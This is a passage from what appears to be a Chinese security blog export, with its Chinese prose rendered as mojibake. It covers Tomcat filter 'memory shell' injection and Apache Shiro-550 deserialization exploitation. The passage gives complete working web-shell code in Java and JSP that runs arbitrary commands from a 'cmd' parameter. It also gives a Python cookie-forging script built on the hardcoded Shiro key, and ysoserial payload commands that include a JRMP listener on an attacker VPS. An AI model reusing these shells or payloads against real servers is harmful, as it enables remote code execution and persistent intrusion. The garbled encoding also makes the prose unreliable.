å†åº¦è·Ÿè¿›filterconfigsï¼Œå°±å¯ä»¥å¾ˆæ˜æ˜¾çš„å‘ç°filterconfigsæ˜¯ä¸€ä¸ªhashmapç»“æ„ é”®ä¸ºfilteråï¼Œå€¼ä¸ºfilterconfig é‚£ä¹ˆfilterconfigçš„ç»“æ„åˆæ˜¯å¦‚ä½•ã€‚æˆ‘ä»¬è·Ÿè¿›ApplicationFilterConfigç±»ã€‚ä¸‹å›¾æ˜¯æ­¤ç±»çš„æ„é€ å‡½æ•° å…³é”®åœ°æ–¹åœˆå‡ºæ¥äº†æ˜¯ä¸filterdefæœ‰å…³çš„ä»£ç ã€‚åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™å°†ä¼ å…¥contextå’Œfilterdefï¼Œç„¶åå†é€šè¿‡å¯¹filterdefè°ƒç”¨getfilterè·å¾—filterç±»ï¼ˆå³æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„filterç±»ï¼‰ã€‚ æˆ‘ä»¬å†çœ‹çœ‹filterDefçš„å…³é”®ä»£ç  OKOKï¼Œä¸Šé¢å°±æ˜¯FilterConfigï¼ŒFilterChainå’ŒFilterDefçš„ä¸€äº›é›¶ç¢çš„ä»‹ç»ã€‚æˆ‘ä»¬å¤§è‡´å¯ä»¥å¾—åˆ°ä¸‹åˆ—å…³é”®ä¿¡æ¯ FilterConfigs æ˜¯ä¸€ä¸ªHashMapç»“æ„ï¼Œé”®ä¸ºfilteråï¼Œå€¼ä¸ºfilterconfigfilterconfigåŒ…å«äº†filterdeffilterdefç›´æ¥ä¸filterç±»ç›¸å…³è” StandardWrapperValue#invoke è¿™ä¸€å±‚åˆ†æå®Œäº†ï¼Œè¿™ä¸€å±‚æ˜¯æœ€éº»çƒ¦çš„ï¼Œå‘ä¸‹ä¸¤å±‚å°†ä¼šäº²åˆ‡å¾ˆå¤šã€‚ ä¸‹é¢çš„ä¸¤å±‚å‘ä¸‹åˆ†ææ¥åˆ°ApplicationFilterChain#doFilter.è¿™ä¸€å±‚å¾ˆç®€å•ï¼Œè°ƒäº†ä¸ªinternalDofilterå°±æ²¡äº† å†å‘ä¸‹åˆ†ææ¥åˆ°ApplicationFilterChain#internalDoFilterã€‚ å…³é”®çš„åœ°æ–¹åœˆå‡ºæ¥äº†ï¼Œå¤§è‡´å°±æ˜¯é€šè¿‡filterchainé‡Œçš„filterconfigçš„getFilteræ–¹æ³•ï¼ˆä¸‹å›¾ä¸ºgetFilteræ–¹æ³•ï¼Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°æ˜¯è¿”å›äº†filterï¼‰ä»è€Œè·å¾—filterdefé‡Œçš„filterï¼Œä»è€Œè°ƒç”¨filterçš„dofilterï¼Œè¿™å°±æ˜¯å¤§æ¦‚çš„æµç¨‹ã€‚ åŠ è½½è¿‡ç¨‹æµç¨‹å›¾æ–‡å­—æ€»æ˜¯æœ‰äº›è´«ç˜ çš„ï¼Œç”¨å›¾æ¥è¯´è¯å°±ä¼šæ˜äº†è®¸å¤šã€‚ FilterDefæ·»åŠ æˆ‘ä»¬å¦‚ä½•æŠŠFilterDefä¸æˆ‘ä»¬çš„Filterå…³è”èµ·æ¥å¹¶æ·»åŠ åˆ°standardContextä¸­å‘¢ï¼Ÿè¿™ä¸ªé—®é¢˜æ¯”è¾ƒå…³é”®ï¼Œå› ä¸ºæˆ‘ä»¬å¿…é¡»å°†æˆ‘ä»¬çš„FilterDefæ³¨å…¥åˆ°å†…å­˜æ‰èƒ½è®©æˆ‘ä»¬çš„Filteræœ‰è¢«è°ƒç”¨çš„å¯èƒ½æ€§ã€‚ å®é™…ä¸Šå‘¢ï¼Œä¹Ÿå¾ˆç®€å•ã€‚æµç¨‹ä¸Šæ¥è¯´ä¸Listenerå†…å­˜é©¬å·®ä¸å¤š æ‰“æ–­ç‚¹ è·Ÿè¿› å†è·Ÿ ç»§ç»­è·Ÿ æ¥åˆ°æ­¤å¤„ï¼Œä¸Listenerå†…å­˜é©¬ç¥ä¼¼ã€‚ifåˆ¤æ–­é‡Œåˆ¤æ–­äº†ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œcontextæ˜¯standardContextï¼Œè¿™é‡Œè°ƒç”¨äº†å®ƒçš„addFilterDefæ¥æ·»åŠ FilterDefã€‚ ç¼–å†™Filterå†…å­˜é©¬æ—¢ç„¶æµç¨‹å·²ç»æ˜ç™½äº†ï¼Œé‚£å†™èµ·æ¥å°±ä¸éš¾äº†.è‡³äºä¸ºä»€ä¹ˆè¦ç”¨åå°„ï¼ŒåŸå› å’ŒListeneræ˜¯ä¸€æ ·çš„ã€‚ åå°„ä»£ç try &#123; response.getWriter().write(&quot;a&quot;); System.out.println(&quot;Servlet Get Message\\n&quot;); Object obj &#x3D; request.getServletContext(); Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); &#x2F;&#x2F;è·å–standardContext FilterDef filterDef &#x3D; new FilterDef(); filterDef.setFilter(new MyFilter()); filterDef.setFilterName(&quot;MyFilter&quot;); standardContext.addFilterDef(filterDef); &#x2F;&#x2F;å°†FilterDefä¸filterå…³è”ï¼Œæ³¨å…¥åˆ°å†…å­˜ field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); field.setAccessible(true); HashMap filterConfigs &#x3D; (HashMap) field.get(standardContext);&#x2F;&#x2F;è·å–filterConfigs Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;). getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); filterConfigs.put(&quot;MyFilter&quot;,constructor.newInstance(standardContext,filterDef)); &#x2F;&#x2F;å°†åŒ…å«filterDefçš„filterConfigæ·»åŠ åˆ°filterConfigs FilterMap filterMap &#x3D; new FilterMap(); filterMap.addURLPattern(&quot;&#x2F;*&quot;); filterMap.setFilterName(&quot;MyFilter&quot;); standardContext.addFilterMapBefore(filterMap); &#x2F;&#x2F;å°†è¯¥filterMapä¸filterConfigè¿›è¡ŒNAMEç»‘å®šå¹¶æ”¾åˆ°filterMapsçš„é¦–ä½ &#125; catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) &#123; e.printStackTrace(); &#125; æœ¨é©¬æœ¬ä½“public class MyFilter implements Filter &#123; public void destroy() &#123; &#125; public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123; String cmder &#x3D; req.getParameter(&quot;cmd&quot;); try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmder); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦ sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); resp.getWriter().write(result); &#125;catch (Exception e)&#123; System.out.println(&quot;error &quot;); &#125; chain.doFilter(req,resp); &#125; public void init(FilterConfig config) throws ServletException &#123; &#125;&#125; ç½‘ä¸Šå«–çš„JSP &lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.util.HashMap&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.BufferedReader&quot; %&gt;&lt;%@ page import&#x3D;&quot;java.io.InputStreamReader&quot; %&gt;&lt;% Object obj &#x3D; request.getServletContext(); Field field &#x3D; obj.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); ApplicationContext applicationContext &#x3D; (ApplicationContext) field.get(obj); field &#x3D; applicationContext.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); StandardContext standardContext &#x3D; (StandardContext) field.get(applicationContext); FilterDef filterDef &#x3D; new FilterDef(); filterDef.setFilterName(&quot;testF&quot;); standardContext.addFilterDef(filterDef); &#x2F;&#x2F; åœ¨contextä¸­æ·»åŠ filterMapæ—¶ä¼šå»æ‰¾ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯¹åº”çš„filterdef Filter filter &#x3D; new testF(); filterDef.setFilter(filter); &#x2F;&#x2F; å°†æˆ‘ä»¬åˆ›å»ºçš„filterä¸filterdefç›¸å…³è”èµ·æ¥ field &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;); field.setAccessible(true); HashMap hashMap &#x3D; (HashMap) field.get(standardContext); Constructor constructor &#x3D; Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); hashMap.put(&quot;testF&quot;,constructor.newInstance(standardContext,filterDef)); FilterMap filterMap &#x3D; new FilterMap(); filterMap.addURLPattern(&quot;&#x2F;*&quot;); filterMap.setFilterName(&quot;testF&quot;); standardContext.addFilterMapBefore(filterMap); System.out.println(&quot;filter ok !&quot;);%&gt;&lt;%! public class testF implements Filter &#123; public void destroy() &#123; &#125; public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException &#123; String cmder &#x3D; req.getParameter(&quot;cmd&quot;); String[] cmd &#x3D; new String[]&#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmder&#125;; try &#123; Process ps &#x3D; Runtime.getRuntime().exec(cmd); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(ps.getInputStream())); StringBuffer sb &#x3D; new StringBuffer(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) &#123; &#x2F;&#x2F;æ‰§è¡Œç»“æœåŠ ä¸Šå›è½¦ sb.append(line).append(&quot;&lt;br&gt;&quot;); &#125; String result &#x3D; sb.toString(); resp.getWriter().write(result); &#125;catch (Exception e)&#123; System.out.println(&quot;error &quot;); &#125; chain.doFilter(req,resp); &#125; public void init(FilterConfig config) throws ServletException &#123; &#125; &#125;%&gt; æ€»ç»“ä¸ªäººæ„Ÿè§‰è¿™ç¯‡æ–‡ç« å†™çš„æ¯”è¾ƒä¹±ï¼Œç‰¹åˆ«æ˜¯Filterå†…å­˜é©¬ã€‚è¿™ä¹Ÿæ˜¯æˆ‘æ‹–äº†3ä¸ªæœˆæ‰æ¥æçš„ä¸œè¥¿ï¼Œè¿™å­¦æœŸäº‹æœ‰ç‚¹å¤šï¼Œå¾ˆå¤šä¹‹å‰æƒ³æçš„ä¸œè¥¿éƒ½æ²¡è…¾å‡ºæ—¶é—´å¼„ã€‚è¿™ç¯‡æ–‡ç« è®²åˆ°çš„å†…å­˜é©¬å®é™…ä¸Šå¹¶æ²¡æœ‰å®ç°å®Œå…¨çš„æ— æ–‡ä»¶è½åœ°ï¼Œä¸­é—´ä¼šæœ‰æ¶æ„JSPæ–‡ä»¶è½åœ°ã€‚æ›´é«˜çº§çš„æ”»å‡»å½¢å¼åé¢å†æå§ã€‚ å‚è€ƒhttp://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/ https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext https://blog.csdn.net/angry_program/article/details/116661899","categories":[],"tags":[{"name":"javaå¼€å‘ä¸å®‰å…¨","slug":"javaå¼€å‘ä¸å®‰å…¨","permalink":"http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"}]},{"title":"shiroååºåˆ—åŒ–(shiro-550ä¸shiro-721)","slug":"shiroååºåˆ—åŒ–(shiro-550ä¸shiro-721)","date":"2021-06-28T13:51:11.047Z","updated":"2021-03-13T07:19:29.768Z","comments":true,"path":"2021/06/28/shiroååºåˆ—åŒ–(shiro-550ä¸shiro-721)/","link":"","permalink":"http://const27.com/2021/06/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(shiro-550%E4%B8%8Eshiro-721)/","excerpt":"","text":"shiroApache shiro æ˜¯javaçš„ä¸€ä¸ªå®‰å…¨æ¡†æ¶ï¼Œå¯ä»¥å¸®åŠ©å®Œæˆè®¤è¯ï¼Œæˆæƒï¼ŒåŠ å¯†ï¼Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚å®ƒä¸è·Ÿä»»ä½•æ¡†æ¶æˆ–å®¹å™¨ç»‘å®šï¼Œå¯ä»¥ç‹¬ç«‹è¿è¡Œã€‚ æ€ä¹ˆåˆ¤æ–­æ˜¯å¦æ˜¯shiroç½‘ç«™å‘é€cookieå¸¦æœ‰rememberMe=0çš„åŒ…ï¼Œè‹¥è¿”å›åŒ…çš„å¤´éƒ¨æœ‰rememberMeï¼Œåˆ™ä¸ºshiroç«™ç‚¹ shiro-550ç®€ä»‹å½“shiroç‰ˆæœ¬å°äº1.2.5æ—¶ï¼Œä¸»è¦æ˜¯ç”±shiroçš„rememberMeå†…å®¹ååºåˆ—åŒ–å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€ æˆçš„åŸå› æ˜¯AESå¯†é’¥è¢«ç¡¬ç¼–ç åœ¨shiroæºç ä¸­ï¼Œè¿™å°±å¯¼è‡´äº†å¯ä»¥é€šè¿‡åœ¨cookieçš„rememberMeå­—æ®µæ’å…¥payloadå®ç°ä»»æ„ä»£ç æ‰§è¡Œ å‰æœŸå‡†å¤‡git clone https://github.com/apache/shiro.git ä¸‹è½½shiro ç„¶å git checkout shiro-root-1.2.4,åˆ‡æ¢åˆ°1.2.4ç‰ˆæœ¬è¿›è¡Œå¯¹åº”ç‰ˆæœ¬çš„æ¼æ´è°ƒè¯• ç¼–è¾‘shiro/samples/web/pom.xmlæ–‡ä»¶ï¼Œåœ¨æ­¤å¤„åŠ å…¥ 1.2 ç„¶åideaæ‰“å¼€shiro/samples/web ä¸‹çš„pom.xml,ç„¶åRun -&gt; Edit Configurations æ·»åŠ TomcatServer å¾…ideaåŠ è½½å®Œmavenåï¼Œå‘tomcatéƒ¨ç½²å·¥ä»¶ å‡ºç°ä»¥ä¸‹é¡µé¢åˆ™è¯´æ˜ç¯å¢ƒæ­å»ºæˆåŠŸ å¼€å§‹åŠ¨è°ƒåºåˆ—åŒ–ï¼ŒåŠ å¯†åœ¨org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin å¤„ä¸‹æ–­ç‚¹ ç„¶åè¿›å…¥shiroç™»é™†é¡µé¢ï¼Œå‹¾é€‰remembermeï¼Œè¿›è¡Œç™»å½•ï¼Œæ–­ç‚¹å‘½ä¸­ ç„¶åä¼šæ ¡éªŒtokené‡Œé¢çš„remembermeæ˜¯å¦ä¸ºtrueï¼Œè‹¥ä¸ºtrueåˆ™æ‰§è¡ŒrememberIdentityå‡½æ•° æˆ‘ä»¬è·Ÿè¿›rememberIdentityå‡½æ•° å‘ç°principalså˜é‡è·å–äº†éœ€è¦rememberçš„ç”¨æˆ·åï¼ˆæ­¤å¤„ä¸ºrootï¼‰ï¼Œç„¶åå†è°ƒç”¨é‡è½½å‡½æ•°rememberIdentityã€‚è¿™ä¸ªå‡½æ•°è°ƒç”¨äº†convertPrincipalsToBytes,æˆ‘ä»¬è·Ÿè¿›çœ‹çœ‹è¿™ä¸ªå‡½æ•° å¯ä»¥å‘ç°å¯¹ä¼ å…¥çš„principalsè°ƒç”¨äº†serializeæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›serializeæ–¹æ³• ç»§ç»­è·Ÿè¿›serializeä¼šæ¥åˆ°è¿™ä¸ªåœ°æ–¹ å‘ç°å°±æ˜¯å¯¹å…¶è°ƒç”¨äº†writeObject()è¿™ä¸ªåŸç”Ÿååºåˆ—æ–¹æ³•è€Œå·²ï¼Œæ²¡ä»€ä¹ˆå¥½åº·çš„ï¼Œè½¬å›å¤´å»çœ‹çœ‹convertPrincipalsToBytesé‚£ä¸ªåŠ å¯†å‡½æ•°encrypt å‘ç°é€šè¿‡getCipherServiceæ–¹æ³•è¿”å›äº†ä¸€ä¸ªä¸œè¥¿ï¼Œå‘ç°æ˜¯åŠ å¯†æ–¹å¼ç­‰ä¸œè¥¿ åœ¨æ­¤å¤„156è¡Œä¼šè°ƒç”¨å¦ä¸€ä¸ªencryptæ–¹æ³•ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åºåˆ—åŒ–åçš„ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™æ˜¯å¯†é’¥ï¼ˆè¿™ä¸ªå¯†é’¥æ˜¯ç¡¬ç¼–ç å†™å…¥æ–‡ä»¶çš„ï¼Œæ‰€ä»¥é€ æˆäº†å®‰å…¨é—®é¢˜ï¼‰æˆ‘ä»¬è·Ÿè¿› è¿™é‡Œçš„ivBytesæ˜¯ä¸€ä¸ªéšæœºç”Ÿæˆçš„ivï¼ˆæˆ‘æ²¡è·Ÿè¿›ç»†çœ‹),ç„¶ååœ¨è¿™ä¸ªæ–¹æ³•æœ€åå®ƒè°ƒç”¨äº†encryptçš„é‡è½½å‡½æ•°ï¼Œå¹¶ä¼ å…¥äº†åºåˆ—åŒ–åçš„ç”¨æˆ·åï¼Œkeyï¼Œivï¼Œä»¥åŠä¸€ä¸ªtrueã€‚æˆ‘ä»¬ç»§ç»­è·Ÿè¿› å¯ä»¥å‘ç°é€šè¿‡arraycopyï¼ŒæŠŠivå’ŒåŠ å¯†åçš„å¯†æ–‡æ•°æ®ï¼ˆaesï¼‰æ”¾å…¥äº†output,æœ€åè¿”å›äº†output. ç„¶åè¿™ä¸ªreturnä¼šä¸€ç›´è¿”å›åˆ°æ­¤å¤„ outputçš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ å…¥äº†rememberSerializedIdentityï¼Œè·Ÿè¿›è¯¥å‡½æ•° 56è¡Œï¼ŒæŠŠbase64åŠ å¯†åçš„outputä½œä¸ºå€¼å†™å…¥åˆ°cookieä¸­çš„remembernameé”® 57è¡Œå°†å…¶è¿”å›ç»™å®¢æˆ·ç«¯ burpæŠ“åŒ…å‘ç°äº‹å®ç¡®å®å¦‚æ­¤ å¦å¤–è¯´ä¸€ä¸‹é‚£ä¸ªç¡¬ç¼–ç keyï¼Œé‚£ä¸ªç¡¬ç¼–ç çš„keyåœ¨AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTESé‡Œ å¯ä»¥å‘ç°é€šè¿‡getEncryptionCipherKeyè·å¾—çš„keyç¡®å®æ˜¯DEFAULT_CIPHER_KEY_BYTES æˆ‘ä»¬ç®€è¦çš„æ¢³ç†ä¸€ä¸‹è¿™ä¸ªæµç¨‹ï¼Œ å½“æˆ‘ä»¬å‹¾é€‰remembermeåï¼Œç”¨æˆ·åä¼šè¢«åºåˆ—åŒ–å¤„ç†ï¼Œç„¶åä¸ç¡¬ç¼–ç çš„keyï¼Œéšæœºç”Ÿæˆçš„ivä¸€èµ·è¿›è¡ŒåŠ å¯†ï¼Œç„¶åä»¥ iv+å¯†æ–‡ çš„base64ç¼–ç è¿”å›ç»™ç”¨æˆ·çš„é”®ä¸ºremembermeçš„cookieé‡Œã€‚ ååºåˆ—åŒ–ï¼Œè§£å¯†åœ¨æˆ‘ä»¬å‹¾é€‰remembermeç™»é™†åï¼Œåˆ·æ–°ï¼ŒæŠ“åŒ…ï¼Œå°†å…¶JSESSIONIDåˆ é™¤ï¼Œä½¿shiroéªŒè¯cookieä¸­remembermeçš„å€¼æ˜¯å¦æ­£ç¡®ï¼ˆå¦‚æœä¸åˆ é™¤JSESSIONIDï¼Œshiroåˆ™ç›´æ¥ä»¥JSESSIONIDä¸ºç™»é™†å‡­è¯äº†ï¼Œå°±ä¸ä¼šéªŒè¯remembermeä¸­çš„å€¼äº†ï¼‰ åœ¨org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity æ‰“ä¸‹æ–­ç‚¹ï¼Œæ”¾åŒ…ï¼Œæ–­ç‚¹å‘½ä¸­ã€‚ è·Ÿè¿›getRememberedPrincipalsæ–¹æ³• éšåå†è·Ÿè¿›getRememberedSerializedIdentity å…³æ³¨è¿™é‡Œçš„86è¡Œï¼Œæ­¤å¤„çš„æ„æ€æ˜¯ä»cookieä¸­è·å¾—base64ç¼–ç åçš„cookieå€¼ï¼Œéšååœ¨90è¡Œå¯¹å…¶è¿›è¡Œå¡«å……ï¼ˆCBCåŠ å¯†ä¸­çš„ä¸€ä¸ªæµç¨‹ï¼‰ï¼Œ95è¡Œè¿›è¡Œbase64è§£ç ï¼Œå¹¶å°†å…¶è¿”å› éšåæˆ‘ä»¬å›åˆ°getRememberedPrincipalsæ–¹æ³•ï¼Œè·Ÿè¿›å…¶convertBytesToPrincipalsæ–¹æ³• å‘ç°å…¶ä¸­æœ‰ä¸ªdecryptæ–¹æ³•ï¼Œè¿™é‡Œçš„decryptæ–¹æ³•å°±æ˜¯å¯¹å…¶è¡Œaesè§£å¯†ï¼Œå–å‰åå…­ä½ä¸ºIVã€‚ ä¸‹é¢140è¡Œåˆ™æ˜¯å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–å¤„ç†äº†ã€‚æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ å†æ¬¡è·Ÿè¿›deserializeæ–¹æ³• çœ‹åˆ°readObject,å°±æ„å‘³ç€ååºåˆ—åŒ–æµç¨‹ç»“æŸäº†ã€‚ æ¢³ç†ä¸€ä¸‹ï¼Œcookieä¸­remenberå€¼ä¼ å…¥åå…ˆbase64è§£ç ï¼Œç„¶åaesè§£å¯†ï¼Œç„¶åååºåˆ—åŒ–ã€‚ è§£å¯†ï¼Œé‡å†™cookieï¼Œä»¥å†™å…¥payloadæ—¢ç„¶keyæ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬çŸ¥é“äº†keyæ˜¯ä»€ä¹ˆï¼ŒåŒæ—¶åœ¨CBCè§£å¯†çš„æ—¶å€™ï¼ŒIVçš„ä½œç”¨åªæ˜¯ä½œä¸ºç¬¬ä¸€ä¸ªåŒºå—å»è§£å¯†ç¬¬äºŒä¸ªåŒºå—ï¼ˆç”Ÿæˆçš„ç»“æœå»è§£å¯†ç¬¬ä¸‰ä¸ªåŒºå—ï¼Œä»¥æ­¤ç±»æ¨ï¼‰ï¼Œæ‰€ä»¥IVå¯ä»¥ä¸ºéšæœºå€¼æ²¡ä»€ä¹ˆç‰¹åˆ«è¦æ±‚ï¼ˆåªè¦èƒ½è§£å¯†å°±è¡Œäº†ï¼‰é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±ä¼ªé€ ä¸€ä¸ªcookieã€‚ pythonè„šæœ¬å¦‚ä¸‹(å«–çš„ç¬‘å¸ˆå‚…çš„)ï¼Œåºåˆ—åŒ–payloadç”¨base64æ ¼å¼ä¼ å…¥ #pip install pycryptoimport sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESkey &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;mode &#x3D; AES.MODE_CBCIV &#x3D; uuid.uuid4().bytesencryptor &#x3D; AES.new(base64.b64decode(key), mode, IV)payload&#x3D;base64.b64decode(sys.argv[1])BS &#x3D; AES.block_sizepad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()payload&#x3D;pad(payload)print(base64.b64encode(IV + encryptor.encrypt(payload))) ç„¶åæˆ‘ä»¬åªéœ€è¦ä¼ å…¥base64ç¼–ç çš„ï¼Œå»é™¤æ¢è¡Œç¬¦çš„payloadå³å¯ã€‚ åƒè¿™æ · java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; å¯†é’¥è·å–æœ‰äº›æ—¶å€™keyå¹¶ä¸æ˜¯ä¸€æˆä¸å˜çš„kPH+bIxk5D2deZiIxcaaaA==ï¼Œè€Œæœ‰å¯èƒ½æ˜¯å…¶ä»–å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å·¥å…·https://github.com/insightglacier/Shiro_exploit æ¥çˆ†ç ´å‡ºå¯†é’¥ python .\\shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 å³å¯å¼€å§‹çˆ†ç ´ï¼Œå½“ç„¶è¿™ä¸ªå·¥å…·çš„ä½œç”¨ä¸ä»…ä»…å¦‚æ­¤ åˆ©ç”¨URLDNSè¿™ä¸ªé“¾å…¶å®æ ¹æœ¬æ²¡å•¥å±å®³..åªæ˜¯æ‹¿æ¥æµ‹è¯•ä¸€ä¸‹æœ‰æ²¡æœ‰æ´ java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar URLDNS &quot;http:&#x2F;&#x2F;cao.7squwf.dnslog.cn&quot; |base64|sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; ç”Ÿæˆpayloadï¼Œåƒcookieä¼ªé€ è„šæœ¬ä¼ å…¥ï¼Œè·å¾—ä¼ªé€ çš„cookie remembermeç™»é™†åï¼Œåˆ·æ–°æŠ“åŒ…ï¼Œåˆ é™¤cookieä¸­çš„sessionï¼Œæ›¿æ¢cookieä¸­çš„remembermeä¸ºä¼ªé€ åçš„cookieã€‚æ”¾åŒ…,DNSLOGæœ‰ååº” ccé“¾ccé“¾2java -jar .&#x2F;ysoserial-master-SNAPSHOT.jar CommonsCollections2 &quot;calc&quot;|base64 |sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; ç„¶ååˆ¶ä½œcookieï¼Œå‘è¿‡å»ï¼ŒæˆåŠŸå¼¹è®¡ç®—å™¨ JRMPé€šè¿‡è¿è¡Œmvn dependency:list å‘½ä»¤å¯ä»¥å‘ç°å½“å‰Commons Collections çš„ç‰ˆæœ¬æ˜¯3.2.1 æŒ‰ç†è¯´ä¼šæœ‰ccé“¾5ï¼Œä½†æ˜¯å®é™…ä¸Šç”¨ysoserial ç”Ÿæˆpayloadç”¨ä¸Šé¢çš„æ–¹æ³•æ‰“è¿‡å»åæ²¡æœ‰ååº”ã€‚çœ‹åˆ«äººåšå®¢å‘ç°æ˜¯è¿™ä¸ªåŸå›  â€œShiro resovleClassä½¿ç”¨çš„æ˜¯ClassLoader.loadClass()è€ŒéClass.forName()ï¼Œè€ŒClassLoader.loadClassä¸æ”¯æŒè£…è½½æ•°ç»„ç±»å‹çš„classã€‚â€ è§£å†³è¿™ç§é—®é¢˜çš„åŠæ³•æ˜¯ç”¨JRMP vpsä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œç›‘å¬ç«¯å£ java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 &#39;calc&#39; æˆ‘ä»¬å†é€šè¿‡ysoserialç”Ÿæˆpayload java -jar ysoserial-master-SNAPSHOT.jar JRMPClient &#39;vps_ip:12006&#39;|base64|sed &#39;:label;N;s&#x2F;\\n&#x2F;&#x2F;;b label&#39; ç„¶åä¼ªé€ cookieï¼Œå‘è¿‡å»ï¼ŒæˆåŠŸå¼¹è®¡ç®—å™¨ å°æ€»ç»“è¿™ä¸ªæ´å› ä¸ºcookieä¸­çš„å€¼ä½¿ç”¨ç¡¬ç¼–ç çš„keyåŠ å¯†è€Œæˆï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤æ¥ä¼ªé€ cookieï¼Œé¡ºä¾¿åœ¨cookieé‡Œå†™å…¥å±é™©çš„paylaodå¦‚ccé“¾payloadï¼Œä½¿cookieä¸­çš„å€¼è¢«è§£å¯†ï¼Œéšåç»å†ååºåˆ—åŒ–ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œ å‚è€ƒï¼šhttps://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E ç¬‘å¸ˆå‚…å¤§å¤§ shiro-721å»å¹´å­¦çš„Padding Oracle åœ¨æ­¤å¤„è¢«åˆ©ç”¨äº†èµ·æ¥ã€‚å¯ä»¥å…ˆçœ‹çœ‹Padding Oracle Attack å¤§æ¦‚æ˜¯ä¸ªå•¥https://const27.com/2021/02/19/Padding%20oracle%20Attack%E4%B8%8ECBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/ å½±å“ç‰ˆæœ¬ï¼š 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1 ç®€ä»‹å…¶å®æ¼æ´ä»£ç å±‚é¢é€»è¾‘ä¸Šå’Œshiro-550å¤§è‡´ç›¸ä¼¼ï¼Œåªä¸è¿‡keyæ²¡æœ‰ç¡¬ç¼–ç è¿›ä»£ç 